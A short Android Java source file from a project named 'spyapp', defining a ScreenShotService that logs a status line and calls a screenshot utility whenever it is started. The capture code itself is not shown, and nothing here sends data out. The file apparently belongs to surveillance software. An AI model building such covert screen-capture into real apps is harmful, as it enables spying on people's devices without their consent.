package com.app.spyapp.service;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.app.spyapp.common.Utils;
import com.app.spyapp.screenshot.ScreentShotUtil;


public class ScreenShotService extends IntentService {


    public ScreenShotService() {
        super(ScreenShotService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Utils.showStatus(this, "SCREEN SHOT SERVICE");
        Log.i("Debug", "onHandleIntent: SCREEN SHOT SERVICE");
        ScreentShotUtil.getInstance().takeScreenshot(ScreenShotService.this);
    }
}
